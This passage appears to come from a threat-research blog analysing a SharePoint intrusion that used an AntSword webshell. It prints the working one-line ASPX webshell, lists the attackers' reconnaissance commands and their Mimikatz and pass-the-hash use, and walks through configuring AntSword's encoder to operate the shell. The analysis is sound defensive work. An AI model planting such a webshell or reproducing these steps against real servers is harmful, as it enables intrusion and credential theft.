						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69289c989e2705008024-1"><span class="crayon-ta">%</span><span class="crayon-sy">@</span><span class="crayon-h"> </span><span class="crayon-i">Page</span><span class="crayon-h"> </span><span class="crayon-v">Language</span><span class="crayon-o">=</span><span class="crayon-s">"Jscript"</span><span class="crayon-o">%</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69289c989e2705008024-2">&nbsp;</div><div class="crayon-line" id="crayon-5f69289c989e2705008024-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69289c989e2705008024-4"><span class="crayon-ta">%</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f69289c989e2705008024-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69289c989e2705008024-6"><span class="crayon-e">eval</span><span class="crayon-sy">(</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">.</span><span class="crayon-e">GetEncoding</span><span class="crayon-sy">(</span><span class="crayon-cn">65001</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Convert</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f69289c989e2705008024-7"><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-v">Request</span><span class="crayon-sy">.</span><span class="crayon-v">Item</span><span class="crayon-sy">[</span><span class="crayon-s">"Darr1R1ng"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-s">"unsafe"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">%</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0023 seconds] -->
<p>As you can see from the code above, the AntSword webshell has no functionality other than running a script provided by the AntSword Shell Manager, specifically within a field named <span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span> of an HTTP POST request. The code above also tells us the actors had created their own custom “encoder” within the AntSword Shell Manager to be able to interact with the code above, which we will discuss in detail in the next section.</p>
<p>The actors used the AntSword webshell to run a variety of commands on the compromised server. The following are a list of the initial commands issued using this webshell that will attempt to do initial system and user discovery, as well as attempt to ping systems of interest:</p>
<ol>
<li>whoami</li>
<li>query user</li>
<li>nltest /domain_Trusts</li>
<li>ping -n 1 &lt;redacted domain name&gt;</li>
<li>ipconfig /all</li>
<li>net group /do</li>
<li>net group Exchange Servers /do</li>
<li>ing -n 1 &lt;redacted hostname of Exchange server&gt;</li>
<li>ping -n 1 &lt;redacted hostname of Exchange server&gt;</li>
<li>query user</li>
</ol>
<p>The ping attempts suggests that this actor seeks to gain access to Microsoft Exchange servers, which may be part of their objective or they desire the elevated privileges on the domain that an Exchange server provides. Also, the ping attempts show the actor misspelled the command their first attempt, which suggests that these commands were issued with hands on-keyboard and not through an automated script. Figure 2 shows the terminal interface within the AntSword Shell Manager application through which the actors would have issued commands.</p>
<figure id="attachment_103661" aria-describedby="caption-attachment-103661" style="width: 1024px" class="wp-caption aligncenter"><img class="wp-image-103661 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-1024x682.png" alt="Figure 2 Terminal within AntSword’s Shell Manager interacting with webshell" width="1024" height="682" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-1024x682.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-768x512.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1-370x246.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-1.png 1042w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption id="caption-attachment-103661" class="wp-caption-text">Figure 2 Terminal within AntSword’s Shell Manager interacting with webshell</figcaption></figure>
<p>While we did not have 100% visibility, we also believe the actors used the AntSword webshell to upload tools to the server as well, specifically cURL, a custom Mimikatz variant, and compiled variants of Impacket’s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec</a> and <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">atexec</a> tools. AntSword has a FileManager interface that provides a navigation capability similar to Windows Explorer, which allows the actor to upload and download files to and from the compromised server. Figure 3 shows the FileManager interface within the AntSword Shell Manager application.</p>
<figure id="attachment_103663" aria-describedby="caption-attachment-103663" style="width: 1024px" class="wp-caption aligncenter"><img class="wp-image-103663 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-1024x680.png" alt="Figure 3 FileManager interface within AntSword’s Shell Manager using the webshell" width="1024" height="680" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-1024x680.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-300x199.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-768x510.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-900x598.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2-370x246.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-2.png 1045w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption id="caption-attachment-103663" class="wp-caption-text">Figure 3 FileManager interface within AntSword’s Shell Manager using the webshell</figcaption></figure>
<p>The actor issued commands to the webshell using these uploaded tools. For instance, the cURL tool was used in the command <span style="font-family: 'courier new', courier, monospace;">curl.exe ipinfo.io</span> &#8212;<span style="font-family: 'courier new', courier, monospace;">max</span>&#8211;<span style="font-family: 'courier new', courier, monospace;">time</span> <span style="font-family: 'courier new', courier, monospace;">5</span> to determine if the server had outbound access to the Internet and to obtain the external IP address of the compromised system. The actors used the ‘<span style="font-family: 'courier new', courier, monospace;">net use</span>’ command, Mimikatz and the Impacket tools specifically for lateral movement. It appears the actors used Mimikatz to dump credentials from memory (<a href="https://attack.mitre.org/techniques/T1003/">T1003</a>) and used the Impacket tools to use the pass the hash (<a href="https://attack.mitre.org/techniques/T1075/">T1075</a>) technique to run commands on other systems.</p>
<h4>Actor’s Custom AntSword Encoder</h4>
<p>To use the AntSword webshell installed on the SharePoint server, the actor had to create a custom encoding module in AntSword. We know this as the default encoders in the AntSword Shell Manager were unable to successfully interact with the <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> webshell. We found that the default base64 encoder would not base64 encode the data in the <span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span> field, rather it would deliver it in cleartext, as seen in HTTP POST request seen in Figure 4. When we attempted to use the default base64 encoder to interact with the <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> webshell installed by the threat actor, the server responded with HTTP 500 error messages as the cleartext <span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span> field contained characters that were not in the base64 alphabet.</p>
<figure id="attachment_103712" aria-describedby="caption-attachment-103712" style="width: 913px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder.png" rel="wpdevart_lightbox"><img class="wp-image-103712 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder.png" alt="Figure 4 HTTP POST request issued by AntSword Shell Manager to webshell using default base64 encoder" width="913" height="286" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder.png 913w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder-300x94.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder-768x241.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder-900x282.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-4-HTTP-POST-request-issued-by-AntSword-Shell-Manager-to-webshell-using-default-base64-encoder-370x116.png 370w" sizes="(max-width: 913px) 100vw, 913px" /></a><figcaption id="caption-attachment-103712" class="wp-caption-text">Figure 4 HTTP POST request issued by AntSword Shell Manager to webshell using default base64 encoder</figcaption></figure>
<p>We determined that the actor must have created a custom encoding module in the AntSword Shell Manager that base64 encoded the entire <span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span> field to successfully interact with the <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> webshell. The AntSword Shell Manager includes an interface for a user to create a custom encoding module, so we set out to determine the steps the actor would take to be able to create this custom encoding to start interacting with the webshell.</p>
<p>1. The actor would first start by opening the AntSword Shell Manager. Based on our analysis, they used AntSword v2.1 specifically. <img class="wp-image-103667" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4.png 1051w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4-300x158.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4-1024x538.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4-768x403.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4-900x473.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-4-370x194.png 370w" sizes="(max-width: 1051px) 100vw, 1051px" />      2. Before interacting with the installed webshell, the actor had to create a custom encoding module. To create the custom encoding module, the actor would click the <span style="font-family: 'courier new', courier, monospace;">AntSword &gt; Encoders manager</span> from the menu.</p>
<p><img class="wp-image-103669" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5.png 1049w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5-300x158.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5-1024x539.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5-768x404.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5-900x474.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-5-370x195.png 370w" sizes="(max-width: 1049px) 100vw, 1049px" /></p>
<p>3. In the Encoder Manager interface, the actor would click the <span style="font-family: 'courier new', courier, monospace;">New Encoder</span> button.</p>
<p><img class="wp-image-103671" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6.png 1052w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6-300x158.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6-1024x538.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6-768x404.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6-900x473.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-6-370x194.png 370w" sizes="(max-width: 1052px) 100vw, 1052px" /></p>
<p>4. From the New Encoder drop down, the actor would select <span style="font-family: 'courier new', courier, monospace;">ASPX</span> as the AntSword webshell installed on the SharePoint server was an ASPX file.</p>
<p><img class="wp-image-103673" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7.png 1053w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7-300x157.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7-1024x536.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7-768x402.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7-900x471.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-7-370x194.png 370w" sizes="(max-width: 1053px) 100vw, 1053px" /></p>
<p>5. The actor would have to name the new encoder and click the blue button to continue. We chose the default name ‘myencoder’ for this example.</p>
<p><img class="wp-image-103675" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8.png 1051w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8-300x157.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8-1024x537.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8-768x403.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8-900x472.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-8-370x194.png 370w" sizes="(max-width: 1051px) 100vw, 1051px" /></p>
<p>6. After creating the new encoder, the actor would select the encoder and click the <span style="font-family: 'courier new', courier, monospace;">Edit</span> menu button.</p>
<p><img class="wp-image-103677" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9.png 1051w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9-300x157.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9-1024x537.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9-768x403.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9-900x472.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-9-370x194.png 370w" sizes="(max-width: 1051px) 100vw, 1051px" /></p>
<p>7. After clicking the Edit button, the EditEncoder window opens and provides an example encoder that the actor can modify. To use the ‘bitreeview.aspx’ webshell on the server, the actor must have modified line 24 of the example encoder to base64 encode the contents ‘<span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span>’ field instead of leaving them in cleartext.</p>
<p><img class="wp-image-103679" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10.png 1043w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10-300x169.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10-1024x575.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10-768x431.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10-900x506.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-10-370x208.png 370w" sizes="(max-width: 1043px) 100vw, 1043px" /></p>
<p>8. To base64 encode the ‘<span style="font-family: 'courier new', courier, monospace;">Darr1R1ng</span>’ field, the actor would modify line 24 to code that has the same functionality as the code displayed in line 24 now. The actor would click the <span style="font-family: 'courier new', courier, monospace;">Save</span> menu button to save the new custom encoding module.</p>
<p><img class="wp-image-103681" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11.png 1045w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11-300x168.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11-1024x574.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11-768x431.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11-900x505.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-11-370x207.png 370w" sizes="(max-width: 1045px) 100vw, 1045px" /></p>
<p>9. With the custom encoding module created, the actor would now add a new shell in the Shell Manager window by right clicking and selecting the <span style="font-family: 'courier new', courier, monospace;">Add</span> button.</p>
<p><img class="wp-image-103683" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12.png 1044w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12-300x168.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12-1024x575.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12-768x431.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12-900x505.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-12-370x208.png 370w" sizes="(max-width: 1044px) 100vw, 1044px" /></p>
<p>10. The Add shell interface opens and allows the actor to configure the location of the shell, the name of the field within the HTTP POST request and the encoding module the webshell will use to interact with the Shell Manager.</p>
<p><img class="wp-image-103685" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13.png 1045w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13-300x168.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13-1024x573.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13-768x430.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13-900x504.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-13-370x207.png 370w" sizes="(max-width: 1045px) 100vw, 1045px" /></p>
<p>11. In this incident, the actor would have added the following settings and clicked the Add menu button:</p>
<ol>
<li style="list-style-type: none;">
<ol>
<li>Set ‘<span style="font-family: 'courier new', courier, monospace;">Shell url</span>’ to URL to the ‘bitreeview.aspx’ webshell (localhost in our testing)</li>
<li>Set ‘<span style="font-family: 'courier new', courier, monospace;">Shell pwd</span>’ to the word ‘Darr1R1ng’</li>
<li>Set ‘<span style="font-family: 'courier new', courier, monospace;">Shell type</span>’ to “ASPX” from the drop down</li>
<li>Checked the radio box next to ‘myencoder’ to select the custom encoder.</li>
</ol>
</li>
</ol>
<p><img class="wp-image-103687" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14.png 1042w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14-1024x682.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14-768x512.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-14-370x246.png 370w" sizes="(max-width: 1042px) 100vw, 1042px" /></p>
<p>12. After clicking the Add button, the shell is now listed within the Shell Managers interface.</p>
<p><img class="wp-image-103689" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15.png 1043w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15-1024x681.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15-768x511.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-15-370x246.png 370w" sizes="(max-width: 1043px) 100vw, 1043px" /></p>
<p>13. To interact with the webshell, the actor would right click the shell and choose actions from the displayed menu. To run commands on the webserver, the actor would select the <span style="font-family: 'courier new', courier, monospace;">Terminal</span> menu button.</p>
<p><img class="wp-image-103691" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16.png 1043w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16-1024x681.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16-768x511.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-16-370x246.png 370w" sizes="(max-width: 1043px) 100vw, 1043px" /></p>
<p>14. The AntSword Shell Manager displays an interface that resembles a command prompt window. It also includes information about the system that the webshell is running on, such as the operating system, current user, current working directory and the storage volumes on the server.</p>
<p><img class="wp-image-103693" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17.png 1042w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17-1024x682.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17-768x512.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-17-370x246.png 370w" sizes="(max-width: 1042px) 100vw, 1042px" /></p>
<p>15. The actor would issue the desired commands in this window, which the webshell would run and respond with the results.</p>
<p><img class="wp-image-103695" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18.png 1042w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18-1024x682.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18-768x512.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-18-370x246.png 370w" sizes="(max-width: 1042px) 100vw, 1042px" /></p>
<p>16. If the actor wished to interact directly with the compromised server’s file system, they could choose the <span style="font-family: 'courier new', courier, monospace;">FileManager</span> menu button from the Shell Manager.</p>
<p><img class="wp-image-103697" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19.png 1043w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19-300x200.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19-1024x681.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19-768x511.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19-900x599.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/word-image-19-370x246.png 370w" sizes="(max-width: 1043px) 100vw, 1043px" /></p>
<h4>AntSword Similarity to China Chopper</h4>
<p>AntSword and China Chopper are both modular webshells that actors would interact with using a client application instead of a web browser. It appears that developers of AntSword may have used China Chopper as a basis for their tool, as the default China Chopper webshell works with the default encoder of AntSword’s ASPX webshell. The major differences between the two involves the code and parameters the two client applications send to the webshell to run commands and other activities. For instance, China Chopper uses two parameters named<span style="font-family: 'courier new', courier, monospace;"> z1</span> and <span style="font-family: 'courier new', courier, monospace;">z2</span> when running commands via the webshell, as seen in Figure 5, whereas AntSword uses four randomly generated names each execution, as seen in Figure 6.</p>
<figure id="attachment_103714" aria-describedby="caption-attachment-103714" style="width: 912px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png" rel="wpdevart_lightbox"><img class="wp-image-103714 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png" alt="Figure 5 HTTP POST request to China Chopper webshell to run a command with arrows pointing to its required parameters" width="912" height="350" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png 912w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-300x115.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-768x295.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-900x345.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-5-HTTP-POST-request-to-China-Chopper-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-370x142.png 370w" sizes="(max-width: 912px) 100vw, 912px" /></a><figcaption id="caption-attachment-103714" class="wp-caption-text">Figure 5 HTTP POST request to China Chopper webshell to run a command with arrows pointing to its required parameters</figcaption></figure>
<p>&nbsp;</p>
<figure id="attachment_103716" aria-describedby="caption-attachment-103716" style="width: 903px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png" rel="wpdevart_lightbox"><img class="wp-image-103716 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png" alt="Figure 6 HTTP POST request to AntSword webshell to run a command with arrows pointing to its required parameters" width="903" height="473" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters.png 903w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-300x157.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-768x402.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-900x471.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-6-HTTP-POST-request-to-AntSword-webshell-to-run-a-command-with-arrows-pointing-to-its-required-parameters-370x194.png 370w" sizes="(max-width: 903px) 100vw, 903px" /></a><figcaption id="caption-attachment-103716" class="wp-caption-text">Figure 6 HTTP POST request to AntSword webshell to run a command with arrows pointing to its required parameters</figcaption></figure>
<p>Not only do the parameters differ, but the code sent to the webshell differs as well. As you can see in Figure 7, the code used to run commands on the webshell by AntSword and China Chopper have several lines of code that are exactly the same, while some lines of code differ and several lines were added to AntSword’s code on the right. The code on the right side of Figure 7 is AntSword, which includes additional lines of code to allow the actor to set environment variables before running the command.</p>
<figure id="attachment_103718" aria-describedby="caption-attachment-103718" style="width: 1024px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell.png" rel="wpdevart_lightbox"><img class="wp-image-103718 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-1024x337.png" alt="Figure 7 Comparison between code used by AntSword and China Chopper to run a command on the webshell" width="1024" height="337" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-1024x337.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-300x99.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-768x253.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-7-Comparison-between-code-used-by-AntSword-and-China-Chopper-to-run-a-command-on-the-webshell-900x296.png 900w, 